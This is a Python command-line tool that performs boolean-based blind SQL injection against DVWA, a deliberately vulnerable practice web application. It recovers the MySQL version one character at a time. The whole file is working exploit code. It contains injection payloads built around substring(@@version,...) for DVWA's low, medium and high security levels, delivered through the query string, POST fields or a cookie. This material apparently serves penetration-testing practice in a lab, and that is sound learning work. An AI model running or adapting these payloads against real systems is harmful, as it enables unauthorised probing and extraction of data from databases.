import requests
from bs4 import BeautifulSoup
import argparse

CHARACTERS = {'.', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'}
MAX_VERSION_LENGTH = 8


def get_char_at_pos(url, cookie, pos, num, security):
    url = f'{url}/vulnerabilities/sqli_blind/'
    method = ''
    data = {}
    if security == 'low':
        method = 'get'
        query = f'?id=1\'+AND+substring(%40%40version%2C{pos}%2C1)%3D%27{num}%27+AND+\'1\'%3D\'1&Submit=Submit'
        url = url + query
    elif security == 'medium':
        method = 'post'
        if num == '.':
            data = {'id': f'1 AND ASCII(substring(@@version,{pos},1))=46', 'Submit': 'Submit'}
        else:
            data = {'id': f'1 AND substring(@@version,{pos},1)={num}', 'Submit': 'Submit'}
    elif security == 'high':
        method = 'get'
        cookie.update({'id': f'1\' AND substring(@@version,{pos},1)=\'{num}\' AND \'1'})

    if method == 'get':
        r = requests.get(url, cookies=cookie)
        if r.status_code == 200:
            return True
        else:
            return False
    elif method == 'post':
        r = requests.post(url, cookies=cookie, data=data)
        soup = BeautifulSoup(r.content, 'html.parser')
        pre_tag = soup.find('pre')
        if pre_tag is not None:
            if pre_tag.text == "User ID exists in the database.":
                return True
            else:
                return False


def get_version(url, cookie, security):
    version = ""
    for pos in range(1, MAX_VERSION_LENGTH):
        if get_char_at_pos(url, cookie, pos, '.', security):
            version += '.'
            continue
        for num in CHARACTERS:
            if get_char_at_pos(url, cookie, pos, num, security):
                version += num
                break
    return version


def main():
    parser = argparse.ArgumentParser(description="DVWA Blind SQL Injection Tool")
    parser.add_argument('-u', '--url', help="Base URL including port, example: http://localhost:80/dvwa", required=True)
    parser.add_argument('-s', '--security', help="Level of DVWA security", required=True)
    parser.add_argument('-p', '--phpsessid', help="PHPSESSID", required=True)

    args = parser.parse_args()

    url = args.url
    security = args.security
    phpsessid = args.phpsessid

    cookies = {
        'security': security,
        'PHPSESSID': phpsessid
    }

    if security in {'low', 'medium', 'high'}:
        print(f'MySQL version: {get_version(url, cookies, security)}')
    else:
        print("Security not supported")


if __name__ == "__main__":
    main()
